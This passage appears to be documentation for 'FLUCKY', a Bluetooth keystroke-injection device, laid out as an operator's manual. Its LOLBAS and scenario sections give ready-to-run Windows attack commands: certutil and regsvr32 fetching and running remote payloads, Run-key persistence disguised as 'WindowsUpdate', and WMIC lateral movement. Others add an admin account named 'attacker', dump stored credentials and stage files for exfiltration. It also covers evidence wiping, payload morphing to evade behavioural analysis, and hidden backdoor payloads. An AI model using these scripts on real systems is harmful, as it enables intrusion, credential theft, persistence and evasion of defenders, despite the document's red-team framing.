**Usage:** `DELAY <ms>`

**Parameters:**
- `<ms>`: Milliseconds to wait (positive integer)

**Examples:**

```bash
# Wait for system to settle after connection
DELAY 3000

# Wait for application to load
STRING notepad.exe
ENTER
DELAY 2000

# Wait for network connection
STRING ping 8.8.8.8
ENTER
DELAY 5000
```

**Best Practices:**
- Add delays between operations for reliability
- Account for application startup times
- Consider network latency for network operations
- Longer delays are safer than too short

#### DEFAULTDELAY \<ms\> / DEFAULT_DELAY \<ms\>

**Description:** Set default delay between all commands.

**Usage:** `DEFAULTDELAY <ms>`

**Parameters:**
- `<ms>`: Milliseconds between commands (positive integer)

**Scope:** Affects all subsequent command executions.

**Script Optimization Example:**

```bash
# Set conservative timing for reliable execution
DEFAULTDELAY 1000

BUTTON_DEF
WIN r
STRING cmd.exe
ENTER
STRING whoami
ENTER
STRING ipconfig
ENTER
END_BUTTON

# Each command now has 1000ms delay after it
```

### Jitter & Randomization

#### SET_JITTER \<ms\>

**Description:** Set maximum random delay range.

**Usage:** `SET_JITTER <ms>`

**Parameters:**
- `<ms>`: Maximum random delay (0-N milliseconds)

**Effect:** Adds 0 to specified milliseconds of random delay after each command.

#### JITTER_ON

**Description:** Enable jitter randomization.

**Usage:** `JITTER_ON`

**Requirement:** `SET_JITTER` must be configured first.

#### JITTER_OFF

**Description:** Disable jitter randomization.

**Usage:** `JITTER_OFF`

#### Jitter Implementation Example

```bash
# Configure jitter for unpredictable timing
SET_JITTER 1000
JITTER_ON

BUTTON_DEF
STRING Command execution with random delays between 0-1000ms
ENTER
DELAY 2000  # Fixed 2-second delay
STRING Another command with jitter after it
ENTER
END_BUTTON
```

### Payload Scheduling

#### SCHEDULE \<ms\> \<script\>

**Description:** Schedule payload execution for future time.

**Usage:** `SCHEDULE <ms> <script>`

**Parameters:**
- `<ms>`: Milliseconds to wait before execution
- `<script>`: Command or script to execute

**Examples:**

```bash
# Schedule single command
SCHEDULE 30000 WIN r

# Schedule multiple commands
SCHEDULE 60000 "WIN r; STRING notepad.exe; ENTER"

# Schedule complex script
SCHEDULE 120000 "STRING Scheduled payload execution; ENTER; DELAY 1000; STRING Completed; ENTER"
```

#### RUN_SCHEDULE

**Description:** Execute scheduled payload immediately.

**Usage:** `RUN_SCHEDULE`

**Use Case:** Manual triggering of scheduled payloads.

### Operational Scheduling Examples

#### Business Hours Activation

```bash
# Schedule for later (calculate milliseconds)
# 1 hour = 3600000 ms
# 8 hours = 28800000 ms
SCHEDULE 28800000 BUTTON_SCRIPT_PRIMARY
```

#### Staggered Attack Timeline

```bash
SCHEDULE 30000 "STRING Phase 1: Initial reconnaissance"
SCHEDULE 60000 "STRING Phase 2: Privilege escalation"
SCHEDULE 90000 "STRING Phase 3: Persistence establishment"
```

---

## 🔄 Advanced Payload Management

### Command Repetition

#### REPEAT \<count\>

**Description:** Repeat last command specified number of times.

**Usage:** `REPEAT <count>`

**Parameters:**
- `<count>`: Number of repetitions (positive integer)

**Requirements:**
- Valid previous command must exist
- Bluetooth connection active
- Positive repetition count

**Examples:**

```bash
# Simple key repetition
STRING Hello
ENTER
REPEAT 3  # Types "Hello" and presses Enter 3 more times

# Navigate through items
DOWNARROW
REPEAT 5  # Presses DOWNARROW 5 more times
```

### Payload Morphing

#### MORPH_PAYLOAD

**Description:** Randomly shuffle execution order of button script.

**Usage:** `MORPH_PAYLOAD`

**Effects:**

| Effect | Description |
|--------|-------------|
| Randomizes line order | Uses Fisher-Yates shuffle algorithm |
| Maintains command integrity | Individual commands remain intact |
| Re-encrypts script | With current XOR key if set |
| Creates unpredictable patterns | Different each time |

**Technical Details:**
- Uses Fisher-Yates shuffle algorithm
- Processes up to 50 script lines
- Maintains script functionality despite order changes
- Particularly effective against behavioral analysis

**Morphing Example:**

```bash
# Original script
BUTTON_DEF
STRING Step 1: Initialization
ENTER
DELAY 1000
STRING Step 2: Execution
ENTER
DELAY 1000
STRING Step 3: Cleanup
ENTER
END_BUTTON

# After MORPH_PAYLOAD
# Execution order randomized, e.g.:
# Step 2, Step 3, Step 1
# Different every time morph is called
```

### Easter Egg System

#### HIDE_EGG \<script\>

**Description:** Store hidden payload script.

**Usage:** `HIDE_EGG "<script>"`

**Parameters:**
- `<script>`: Script content (up to 4096 characters)

**Security:** Automatically encrypted if XOR key set.

**Example:**

```bash
# Hide emergency cleanup script
HIDE_EGG "STRING Removing evidence...; ENTER; DELAY 1000; STRING Evidence removed; ENTER"
```

#### ACTIVATE_EGG

**Description:** Execute hidden easter egg payload.

**Usage:** `ACTIVATE_EGG`

**Use Cases:**
- Secret backdoor activation
- Emergency cleanup procedures
- Special privilege escalation
- Hidden contingency operations

**Covert Operations Example:**

```bash
# Hide emergency cleanup script
HIDE_EGG "STRING Removing evidence...; ENTER; DELAY 1000; STRING Evidence removed; ENTER"

# Normal operation continues...
BUTTON_DEF
STRING Normal reconnaissance script
ENTER
END_BUTTON

# Later, activate hidden egg
ACTIVATE_EGG
```

---

## 🎪 Chaos Mode & Behavioral Randomization

### Unpredictable Execution

#### CHAOS_ON

**Description:** Enable random script execution mode.

**Usage:** `CHAOS_ON`

**Effects:**

| Effect | Details |
|--------|---------|
| Random script execution | Executes button script at random intervals |
| Interval range | 5-15 seconds between executions |
| Unpredictable behavior | Creates varied system activity |
| Testing value | Excellent for stress testing and awareness training |

#### CHAOS_OFF

**Description:** Disable chaos mode.

**Usage:** `CHAOS_OFF`

### Chaos Mode Implementation

```bash
# Define a disruptive but non-destructive script
BUTTON_DEF
STRING Chaos testing in progress...
ENTER
DELAY 500
PRESS CAPS_LOCK
DELAY 500
STRING System stability test
ENTER
END_BUTTON

# Enable chaos mode
CHAOS_ON
# Script now executes randomly every 5-15 seconds
```

### Real-World Chaos Scenarios

#### Security Awareness Training

```bash
CHAOS_ON
BUTTON_DEF
STRING Security Alert: Unusual activity detected
ENTER
DELAY 2000
STRING Please contact IT immediately
ENTER
END_BUTTON
```

#### System Stress Testing

```bash
CHAOS_ON
BUTTON_DEF
WIN r
STRING calc.exe
ENTER
DELAY 1000
STRING 12345 * 67890
ENTER
END_BUTTON
```

---

## 🔧 Button Management

### Trigger Control

#### ENABLE_BUTTON

**Description:** Enable physical button triggers.

**Usage:** `ENABLE_BUTTON`

**Effect:** Both GPIO 0 and GPIO 2 buttons become active.

#### DISABLE_BUTTON

**Description:** Disable physical button triggers.

**Usage:** `DISABLE_BUTTON`

**Effect:** Buttons become inactive, preventing accidental activation.

### Operational Security

```bash
# Transport mode - buttons disabled
DISABLE_BUTTON
# Device can be safely transported
# No risk of accidental payload execution

# Operational mode - buttons enabled
ENABLE_BUTTON
# Ready for mission execution
```

### Dual-Button Strategy

**Primary Button (GPIO 0):**
- Main operational payload
- Comprehensive attack scripts
- Multi-stage execution sequences

**Secondary Button (GPIO 2):**
- Quick reconnaissance
- Emergency procedures
- Alternative persistence methods
- Decoy activities

**Example Configuration:**

```bash
# Primary - Comprehensive attack
BUTTON_DEF
STEALTH_ON
DELAY 2000
STRING Main operational payload...
ENTER
# ... comprehensive script ...
END_BUTTON

# Secondary - Quick intelligence
BUTTON2_DEF
STRING Quick system info...
ENTER
DELAY 1000
STRING hostname && whoami
ENTER
END_BUTTON2
```

---

<div align="center">

# Part 3: LOLBAS, Psychological Warfare & Real-World Operations

<img src="https://img.shields.io/badge/Technique-LOLBAS-red?style=flat-square" alt="LOLBAS">
<img src="https://img.shields.io/badge/Technique-Gaslighting-purple?style=flat-square" alt="Gaslighting">
<img src="https://img.shields.io/badge/Focus-Research-blue?style=flat-square" alt="Research">

### From Fileless Execution to Mind Games - The Complete Operator's Toolkit

*"Why break in when you can live off the land? Why attack systems when you can influence minds?"*

</div>

---

## 🏴‍☠️ LOLBAS Integration - Living Off The Land

### The Philosophy of Fileless Operations

LOLBAS (Living Off The Land Binaries and Scripts) represents the pinnacle of modern tradecraft. Instead of dropping malware, use what's already there. FLUCKY integrates comprehensive LOLBAS capabilities to make your operations virtually undetectable.

**Why LOLBAS Matters:**

Traditional malware drops files to disk, which are detected by antivirus, analyzed by EDR, and leave forensic evidence. LOLBAS techniques use built-in system tools that are trusted, expected, and often excluded from security monitoring. This approach is called "fileless" because no malicious files are written to disk.

### System Binary Exploitation

#### LOLBAS_CIPHER \<param\>

**Description:** Execute cipher.exe for secure deletion or disk operations.

**Usage:** `LOLBAS_CIPHER <param>`

**Common Parameters:**

| Parameter | Effect |
|-----------|--------|
| `/w:C:\` | Wipe free space on C: drive (data destruction) |
| `/w:D:\folder` | Wipe specific directory free space |
| `/d:C:` | Decryption of specified drive |

**Operational Use:**

```bash
# Evidence destruction
LOLBAS_CIPHER /w:C:\temp
# Overwrites free space in temp directory
```

**Security Implications:**
cipher.exe is a legitimate Windows tool for managing Encrypted File System (EFS). Its data wiping capability can securely erase deleted data, preventing forensic recovery. This is useful for cleaning up after authorized assessments.

#### LOLBAS_CMD \<param\>

**Description:** Execute commands via cmd.exe.

**Usage:** `LOLBAS_CMD "<commands>"`

**Advantages:**
- Bypasses some application whitelisting
- Inherits cmd.exe's trusted status
- Supports batch operations

**Examples:**

```bash
# Basic system reconnaissance
LOLBAS_CMD "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""

# Network discovery
LOLBAS_CMD "arp -a && netstat -ano"

# User information gathering
LOLBAS_CMD "net user && whoami /priv"

# Process listing
LOLBAS_CMD "tasklist /v"

# Network connections
LOLBAS_CMD "netstat -ano | findstr ESTABLISHED"
```

#### LOLBAS_CMDKEY \<param\>

**Description:** Manage stored credentials with cmdkey.exe.

**Usage:** `LOLBAS_CMDKEY <param>`

**Operational Value:**
- List stored Windows credentials
- Create new credential entries
- Dump authentication tokens

**Credential Operations:**

```bash
# List all stored credentials
LOLBAS_CMDKEY /list

# Create persistent credential (example)
LOLBAS_CMDKEY /add:targetname /user:username /pass:password

# Delete credential
LOLBAS_CMDKEY /delete:targetname
```

#### LOLBAS_CERTUTIL \<param\>

**Description:** Leverage certutil.exe for file operations.

**Usage:** `LOLBAS_CERTUTIL <param>`

**Capabilities:**
- File download without external tools
- Base64 encoding/decoding
- File integrity checking
- Certificate operations

**File Transfer Operations:**

```bash
# Download file from web server
LOLBAS_CERTUTIL -urlcache -split -f http://server/file.exe C:\Windows\Temp\file.exe

# Encode file to base64 (exfiltration prep)
LOLBAS_CERTUTIL -encode C:\secrets.txt C:\encoded.txt

# Decode base64 file
LOLBAS_CERTUTIL -decode C:\encoded.txt C:\decoded.txt

# Calculate file hash
LOLBAS_CERTUTIL -hashfile C:\file.exe MD5
```

#### LOLBAS_REG \<param\>

**Description:** Registry manipulation via reg.exe.

**Usage:** `LOLBAS_REG <param>`

**Persistence Techniques:**
- Run key modifications
- Service configuration changes
- Policy alterations

**Persistence Examples:**

```bash
# Add to Run key for persistence
LOLBAS_REG add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe"

# Query current Run entries
LOLBAS_REG query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# Delete persistence entry
LOLBAS_REG delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# Query specific key
LOLBAS_REG query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### LOLBAS_WMIC \<param\>

**Description:** Windows Management Instrumentation commands.

**Usage:** `LOLBAS_WMIC <param>`

**Advanced Capabilities:**
- Process creation and management
- System information gathering
- Remote command execution
- Event log manipulation

**WMIC Operations:**

```bash
# Create process remotely (lateral movement)
LOLBAS_WMIC /node:192.168.1.100 process call create "cmd.exe /c whoami > C:\output.txt"

# List all processes
LOLBAS_WMIC process get name,processid,commandline

# System information gathering
LOLBAS_WMIC computersystem get name,username,domain,totalphysicalmemory

# List running services
LOLBAS_WMIC service where "state='running'" get name,displayname

# Get startup commands
LOLBAS_WMIC startup get caption,command
```

#### LOLBAS_REGSVR32 \<param\>

**Description:** Execute scripts via regsvr32.exe.

**Usage:** `LOLBAS_REGSVR32 <param>`

**Technique:** Squiblydoo attack variant
- Executes remote scripts
- Bypasses application control
- Appears as legitimate system activity

**Script Execution:**

```bash
# Execute remote scriptlet
LOLBAS_REGSVR32 /s /n /u /i:http://server/payload.sct scrobj.dll

# Local scriptlet execution
LOLBAS_REGSVR32 /s /u /i:payload.sct scrobj.dll
```

#### LOLBAS_WSCRIPT \<param\>

**Description:** Execute VBScript/JScript via wscript.exe.

**Usage:** `LOLBAS_WSCRIPT <param>`

**Use Cases:**
- Legacy script execution
- COM object manipulation
- File system operations

**Script Examples:**

```bash
# Execute VBScript file
LOLBAS_WSCRIPT //e:vbscript C:\payload.vbs

# Execute JScript
LOLBAS_WSCRIPT //e:jscript C:\payload.js

# Execute with no banner
LOLBAS_WSCRIPT //nologo C:\script.vbs
```

---

## 🧠 Gaslighting - Psychological Operations

### The Art of Psychological Influence

Gaslighting transforms FLUCKY from a technical tool into a psychological awareness testing platform. Make users question their reality, test security awareness, and create realistic training scenarios.

**The Purpose of Gaslighting Features:**

These features are designed specifically for security awareness training. By creating subtle, realistic system anomalies, security teams can test whether users notice and respond appropriately to unusual behavior. This type of training is far more effective than theoretical instruction because it creates memorable experiences that users can reference in real situations.

### Individual Gaslighting Commands

#### GASLIGHT_TYPO

**Description:** Introduce realistic typing errors.

**Usage:** `GASLIGHT_TYPO`

**Effect:** Types "teh" then corrects to "the"

**Psychological Impact:**
- Appears as natural human error
- Creates minor frustration
- Tests user attention to detail

#### GASLIGHT_CAPS_TOGGLE \<min\> \<max\>

**Description:** Randomly toggle Caps Lock.

**Usage:** `GASLIGHT_CAPS_TOGGLE <min> <max>`

**Parameters:**
- `<min>`: Minimum delay in milliseconds
- `<max>`: Maximum delay in milliseconds

**Example:**
```bash
# Toggle Caps Lock every 30-120 seconds
GASLIGHT_CAPS_TOGGLE 30000 120000
```

**Psychological Impact:**
- Creates confusion about keyboard state
- Mimics hardware "glitches"
- Tests user technical awareness

#### GASLIGHT_FOCUS_STEAL \<min\> \<max\>

**Description:** Randomly switch application focus.

**Usage:** `GASLIGHT_FOCUS_STEAL <min> <max>`

**Effect:** ALT+TAB to switch windows randomly

**Operational Use:**
- Disrupts concentration during critical tasks
- Tests user multitasking ability
- Creates "system instability" perception

#### GASLIGHT_NOTIFICATION \<min\> \<max\>

**Description:** Trigger system notification center.

**Usage:** `GASLIGHT_NOTIFICATION <min> <max>`

**Effect:** Briefly opens notification panel then closes

**Psychological Effect:**
- Creates distraction from current work
- Mimics system notification behavior
- Tests user response to interruptions

#### GASLIGHT_MEDIA_PAUSE \<min\> \<max\>

**Description:** Randomly pause media playback.

**Usage:** `GASLIGHT_MEDIA_PAUSE <min> <max>`

**Impact:** Affects music, videos, presentations

**Use Cases:**
- Disrupts background media during work
- Creates confusion about media player behavior
- Excellent for awareness training scenarios

#### GASLIGHT_VOLUME_JITTER \<min\> \<max\>

**Description:** Random small volume adjustments.

**Usage:** `GASLIGHT_VOLUME_JITTER <min> <max>`

**Effect:** 1-3 volume steps up or down randomly

**Subtle Influence:**
- Barely noticeable volume changes
- Creates subliminal discomfort
- Tests audio awareness

#### GASLIGHT_WIGGLE \<min\> \<max\>

**Description:** Simulate cursor movement.

**Usage:** `GASLIGHT_WIGGLE <min> <max>`

**Effect:** Types space then backspace rapidly

**Psychological Impact:**
- Creates "ghost typing" sensation
- Mimics touchpad or mouse issues
- Tests user observation skills

#### GASLIGHT_MINIMIZE \<min\> \<max\>

**Description:** Randomly minimize windows.

**Usage:** `GASLIGHT_MINIMIZE <min> <max>`

**Effect:** Minimizes current active window

**Disruption Level:**
- High visibility "glitch"
- Significant work disruption
- Tests user patience and problem-solving

#### GASLIGHT_RUN_COMMAND \<min\> \<max\>

**Description:** Briefly flash Run dialog.

**Usage:** `GASLIGHT_RUN_COMMAND <min> <max>`

**Effect:** Opens then immediately closes Run dialog

**Security Testing:**
- Tests if users notice security-related dialogs
- Creates "system probing" suspicion
- Excellent for security awareness metrics

### Gaslighting Profile System

#### Complete Behavioral Profiles

| Command | Description |
|---------|-------------|
| `GASLIGHT_PROFILE_START` | Begin gaslighting profile definition |
| `GASLIGHT_PROFILE_END` | Save and activate gaslighting profile |
| `GASLIGHT_STOP` | Stop all gaslighting activities |

### Complete Gaslighting Scenarios

#### Corporate Security Awareness Training

```bash
GASLIGHT_PROFILE_START
GASLIGHT_TYPO
GASLIGHT_CAPS_TOGGLE 30000 120000
GASLIGHT_FOCUS_STEAL 45000 180000
GASLIGHT_NOTIFICATION 60000 240000
GASLIGHT_MEDIA_PAUSE 90000 300000
GASLIGHT_VOLUME_JITTER 120000 480000
GASLIGHT_WIGGLE 150000 600000
GASLIGHT_MINIMIZE 180000 720000
GASLIGHT_RUN_COMMAND 240000 900000
GASLIGHT_PROFILE_END
```

#### Subtle Psychological Influence

```bash
GASLIGHT_PROFILE_START
GASLIGHT_TYPO
GASLIGHT_CAPS_TOGGLE 60000 300000  # Less frequent
GASLIGHT_VOLUME_JITTER 300000 900000  # Very subtle
GASLIGHT_PROFILE_END
```

#### Aggressive System Testing

```bash
GASLIGHT_PROFILE_START
GASLIGHT_FOCUS_STEAL 15000 60000    # Frequent
GASLIGHT_MINIMIZE 30000 120000      # Often
GASLIGHT_MEDIA_PAUSE 45000 180000   # Regular
GASLIGHT_PROFILE_END
```

---

## 🎯 Real-World Operational Scenarios

### Scenario 1: Corporate Red Team Assessment

**Objective:** Gain persistent access and assess detection capabilities (with written authorization)

```bash
# Phase 1: Initial foothold
SET_XOR_KEY CorpRedTeam2024!
STEALTH_ON

BUTTON_DEF
DELAY 3000
WIN r
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process cmd -WindowStyle Hidden"
ENTER
DELAY 2000
STRING whoami /groups > C:\Windows\Temp\privs.txt
ENTER
DELAY 1000
STRING net user %username% > C:\Windows\Temp\userinfo.txt
ENTER
DELAY 1000
STRING ipconfig /all > C:\Windows\Temp\network.txt
ENTER
END_BUTTON

# Phase 2: Persistence establishment
BUTTON2_DEF
DELAY 2000
LOLBAS_REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\notepad.exe"
ENTER
DELAY 1000
LOLBAS_CERTUTIL -urlcache -split -f http://internal-server/tools/beacon.exe C:\Windows\Temp\svchost.exe
ENTER
END_BUTTON2

# Phase 3: Gaslighting for awareness testing
GASLIGHT_PROFILE_START
GASLIGHT_TYPO
GASLIGHT_RUN_COMMAND 120000 300000
GASLIGHT_NOTIFICATION 180000 420000
GASLIGHT_PROFILE_END

SELF_DESTRUCT 3
```

### Scenario 2: Physical Security Assessment

**Objective:** Test physical security controls and response procedures

```bash
# Covert intelligence gathering
SET_XOR_KEY PhysicalSecTest
STEALTH_ON
DISABLE_BUTTON  # Safe transport

BUTTON_DEF
DELAY 5000  # Allow for device placement
STEALTH_OFF  # Brief visibility for testing
STRING Physical Security Test in Progress
ENTER
DELAY 2000
STRING If found, please contact security team
ENTER
DELAY 1000
STEALTH_ON
STRING Gathering system information...
ENTER
DELAY 2000
LOLBAS_CMD "systeminfo | findstr /B /C:\"Host Name\" /C:\"Domain\""
ENTER
DELAY 3000
LOLBAS_WMIC computersystem get name,username,domain
ENTER
END_BUTTON

# Emergency cleanup script
HIDE_EGG "STRING Removing test artifacts...; ENTER; DELAY 1000; LOLBAS_REG delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /f; ENTER; STRING Cleanup complete; ENTER"

ENABLE_BUTTON
```

### Scenario 3: Security Awareness Training

**Objective:** Train users to recognize subtle attack indicators

```bash
# Visible training mode
STEALTH_OFF

BUTTON_DEF
STRING SECURITY AWARENESS TRAINING
ENTER
DELAY 2000
STRING This is a simulated security test
ENTER
DELAY 2000
STRING Watch for unusual system behavior
ENTER
DELAY 3000
STRING Training session active for next 30 minutes
ENTER
END_BUTTON

# Subtle gaslighting profile
GASLIGHT_PROFILE_START
GASLIGHT_TYPO
GASLIGHT_CAPS_TOGGLE 60000 180000
GASLIGHT_FOCUS_STEAL 120000 300000
GASLIGHT_NOTIFICATION 180000 420000
GASLIGHT_PROFILE_END

# Chaos mode for unpredictable training
CHAOS_ON
BUTTON2_DEF
STRING Did you notice this activity?
ENTER
DELAY 2000
STRING Report suspicious behavior to IT
ENTER
END_BUTTON2
```

### Scenario 4: Incident Response Drill

**Objective:** Test IR team capabilities with realistic attack simulation

```bash
# Multi-phase attack simulation
SET_XOR_KEY IRDrill2024

# Phase 1: Initial detection triggers
BUTTON_DEF
DELAY 10000  # Allow IR team to get situated
STRING [SIMULATION] Stage 1: Initial Compromise Detected
ENTER
DELAY 3000
LOLBAS_CMD "net user attacker P@ssw0rd! /add && net localgroup administrators attacker /add"
ENTER
DELAY 5000
STRING [SIMULATION] Stage 2: Privilege Escalation Successful
ENTER
END_BUTTON

# Phase 2: Persistence and lateral movement
BUTTON2_DEF
DELAY 15000  # Mid-drill activation
STRING [SIMULATION] Stage 3: Lateral Movement Detected
ENTER
DELAY 2000
LOLBAS_WMIC /node:192.168.1.50 process call create "cmd.exe /c whoami"
ENTER
DELAY 5000
STRING [SIMULATION] Stage 4: Data Exfiltration Attempt
ENTER
DELAY 2000
LOLBAS_CERTUTIL -encode C:\important.docx C:\encoded.txt
ENTER
END_BUTTON2

SCHEDULE 300000 "STRING [SIMULATION] Stage 5: Drill Complete - Please Debrief"
```

---

## 🔧 Advanced Operational Security

### Transport and Deployment Procedures

#### Safe Transport Configuration

```bash
DISABLE_BUTTON
STEALTH_ON
SET_XOR_KEY MissionSpecificKey
# Device is now safe for physical transport
# No risk of accidental activation
# All scripts encrypted
```

#### Rapid Deployment

```bash
ENABLE_BUTTON
STEALTH_OFF  # Optional - based on opsec requirements
STATUS  # Verify system ready
# Device operational in under 10 seconds
```

### Mission Planning Templates

#### Quick Reconnaissance

```bash
BUTTON_DEF
DELAY 3000
STRING Quick System Assessment
ENTER
DELAY 1000
LOLBAS_CMD "whoami && hostname && systeminfo | findstr /B /C:\"OS Name\""
ENTER
DELAY 2000
LOLBAS_CMD "ipconfig && netstat -ano | findstr :443"
ENTER
END_BUTTON
```

#### Persistence Establishment

```bash
BUTTON_DEF
DELAY 2000
LOLBAS_REG add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "C:\Windows\System32\notepad.exe"
ENTER
DELAY 1000
LOLBAS_CERTUTIL -urlcache -split -f http://server/payload.exe C:\Users\Public\payload.exe
ENTER
END_BUTTON
```

#### Evidence Cleanup

```bash
BUTTON_DEF
STRING Removing operational artifacts...
ENTER
DELAY 1000
LOLBAS_CMD "del C:\Windows\Temp\*.txt /q && del C:\Users\Public\payload.exe /q"
ENTER
DELAY 1000
LOLBAS_REG delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /f
ENTER
DELAY 1000
LOLBAS_CIPHER /w:C:\temp
ENTER
END_BUTTON
```

---

## 🎯 Best Practices & Operational Guidelines

### Operational Security

1. **Always set XOR keys** for mission-specific encryption
2. **Use STEALTH_ON** for real operations, STEALTH_OFF for testing
3. **Configure SELF_DESTRUCT** based on mission parameters
4. **Test all scripts** in controlled environment first
5. **Have cleanup procedures ready** via easter eggs or secondary scripts

### Script Development

1. **Include realistic delays** for system response times
2. **Use LOLBAS** instead of external tools when possible
3. **Implement error handling** through multiple execution paths
4. **Test on target OS versions** before deployment
5. **Keep scripts modular** for easy modification

### Training and Assessment

1. **Start subtle with gaslighting** - increase intensity based on response
2. **Use chaos mode** for stress testing and awareness training
3. **Schedule payloads** to test monitoring and response capabilities
4. **Implement gaslighting profiles** that match assessment objectives
5. **Always debrief** after training exercises

---

<div align="center">

# Part 4: Essential Reference, Troubleshooting & Community

<img src="https://img.shields.io/badge/Type-Reference-blue?style=flat-square" alt="Reference">
<img src="https://img.shields.io/badge/Type-Troubleshooting-orange?style=flat-square" alt="Troubleshooting">
<img src="https://img.shields.io/badge/Type-Community-green?style=flat-square" alt="Community">

### The Missing Pieces - From Quick Reference to Advanced Support

*"Great tools deserve great documentation. Here's everything else you need."*

</div>

---

## 📋 Complete Command Reference Table

### Quick Command Lookup

| Category | Command | Parameters | Description |
|----------|---------|------------|-------------|
| **System** | `STATUS` | None | Show system status |
| | `rename <name>` | Name | Change device name |
| | `clear` | None | Clear terminal |
| | `help` | None | Show help |
| **Bluetooth** | `DISCONNECT` | None | Terminate connection |
| | `RECONNECT` | None | Reinitialize BLE |
| **Basic Keys** | `ENTER` | None | Press Enter key |
| | `SPACE` | None | Press Space bar |
| | `TAB` | None | Press Tab key |
| | `ESC` / `ESCAPE` | None | Press Escape key |
| | `BREAK` / `PAUSE` | None | Press Break/Pause |
| | `INSERT` | None | Press Insert key |
| | `DELETE` | None | Press Delete key |
| | `BACKSPACE` | None | Press Backspace key |
| **Navigation** | `UPARROW` | None | Press Up arrow |
| | `DOWNARROW` | None | Press Down arrow |
| | `LEFTARROW` | None | Press Left arrow |
| | `RIGHTARROW` | None | Press Right arrow |
| | `HOME` | None | Press Home key |
| | `END` | None | Press End key |
| | `PAGEUP` | None | Press Page Up |
| | `PAGEDOWN` | None | Press Page Down |
| **Modifiers** | `WIN` / `META` | None | Press Windows key |
| | `WIN <key>` | Char | Windows + key combo |
| | `CTRL <key>` | Char | Control + key combo |
| | `ALT <key>` | Char | Alt + key combo |
| | `SHIFT <key>` | Char | Shift + key combo |
| | `CTRL ALT DELETE` | None | Three-key combo |
| **Function Keys** | `F1` - `F12` | None | Press function keys |
| **Media Keys** | `VOLUMEUP` | None | Volume up |
| | `VOLUMEDOWN` | None | Volume down |
| | `MUTE` | None | Toggle mute |
| | `PLAY` / `PAUSE` | None | Media play/pause |
| | `NEXTTRACK` | None | Next track |
| | `PREVTRACK` | None | Previous track |
| **String Input** | `STRING <text>` | Text | Type text string |
| | `<character>` | Char | Press single key |
| **Script Management** | `script` | None | Enter script mode |
| | `BUTTON_DEF` | None | Define button script |
| | `BUTTON2_DEF` | None | Define button2 script |
| **Timing** | `DELAY <ms>` | Ms | Insert delay |
| | `DEFAULTDELAY <ms>` | Ms | Default delay |
| | `SET_JITTER <ms>` | Ms | Jitter range |
| | `JITTER_ON` | None | Enable jitter |
| | `JITTER_OFF` | None | Disable jitter |
| **Stealth** | `STEALTH_ON` | None | Enable stealth |
| | `STEALTH_OFF` | None | Disable stealth |
| **Encryption** | `SET_XOR_KEY <key>` | Key | Set encryption key |
| | `SELF_DESTRUCT <n>` | Count | Auto-erase scripts |
| **Obfuscation** | `OBFUSCATE_ON` | None | Basic obfuscation |
| | `OBFUSCATE_OFF` | None | Disable basic |
| | `ADV_OBFUSCATE_ON` | None | Advanced obfuscation |
| | `ADV_OBFUSCATE_OFF` | None | Disable advanced |
| **Scheduling** | `SCHEDULE <ms> <script>` | Time + script | Schedule payload |
| | `RUN_SCHEDULE` | None | Run scheduled |
| **Chaos** | `CHAOS_ON` | None | Enable chaos |
| | `CHAOS_OFF` | None | Disable chaos |
| **LOLBAS** | `LOLBAS_CIPHER <param>` | Params | cipher.exe |
| | `LOLBAS_CMD <param>` | Params | cmd.exe |
| | `LOLBAS_CMDKEY <param>` | Params | cmdkey.exe |
| | `LOLBAS_CERTUTIL <param>` | Params | certutil.exe |
| | `LOLBAS_REG <param>` | Params | reg.exe |
| | `LOLBAS_WMIC <param>` | Params | wmic.exe |
| | `LOLBAS_REGSVR32 <param>` | Params | regsvr32.exe |
| | `LOLBAS_WSCRIPT <param>` | Params | wscript.exe |
| **Gaslighting** | `GASLIGHT_TYPO` | None | Typo simulation |
| | `GASLIGHT_CAPS_TOGGLE` | Min max | Caps lock toggle |
| | `GASLIGHT_FOCUS_STEAL` | Min max | Window switching |
| | `GASLIGHT_NOTIFICATION` | Min max | Notifications |
| | `GASLIGHT_MEDIA_PAUSE` | Min max | Pause media |
| | `GASLIGHT_VOLUME_JITTER` | Min max | Volume changes |
| | `GASLIGHT_WIGGLE` | Min max | Cursor wiggle |
| | `GASLIGHT_MINIMIZE` | Min max | Minimize windows |
| | `GASLIGHT_RUN_COMMAND` | Min max | Flash Run dialog |
| | `GASLIGHT_PROFILE_START` | None | Begin profile |
| | `GASLIGHT_PROFILE_END` | None | End profile |
| | `GASLIGHT_STOP` | None | Stop all |
| **Buttons** | `ENABLE_BUTTON` | None | Enable triggers |
| | `DISABLE_BUTTON` | None | Disable triggers |
| **Payloads** | `REPEAT <n>` | Count | Repeat last command |
| | `MORPH_PAYLOAD` | None | Randomize script |
| | `HIDE_EGG <script>` | Script | Hidden payload |
| | `ACTIVATE_EGG` | None | Execute hidden |

**Total Documented Commands: 73** ✅

---

## 🚨 Troubleshooting & Error Guide

### Common Issues and Solutions

#### Bluetooth Connectivity Problems

**Issue: "Error: Bluetooth not connected"**

*Symptoms:*
- STATUS shows "Bluetooth: Disconnected"
- Commands fail with Bluetooth error
- No response from target system

*Solutions:*
1. Run `RECONNECT` to force reconnection
2. Check target device Bluetooth settings
3. Ensure ESP32 is in range (typically 10m)
4. Verify no other HID devices are blocking
5. Run `DISCONNECT` then `RECONNECT` for hard reset

**Issue: Device not appearing in Bluetooth list**

*Solutions:*
1. Run `STATUS` to verify BLE is running
2. Run `rename "Legitimate Keyboard"` with convincing name
3. Check ESP32 power supply (stable 3.3V needed)
4. Verify firmware flashed correctly
5. Monitor serial for BLE initialization errors

#### Script Execution Issues

**Issue: "Error: Invalid command length"**

*Cause:* Command exceeds 256 character limit

*Fix:* Split long commands into parts

```bash
# Bad - too long:
STRING This is a very long command that exceeds the maximum allowed character limit and will fail

# Good - split:
STRING This is part one of a long command
DELAY 100
STRING This is part two of the same command
```

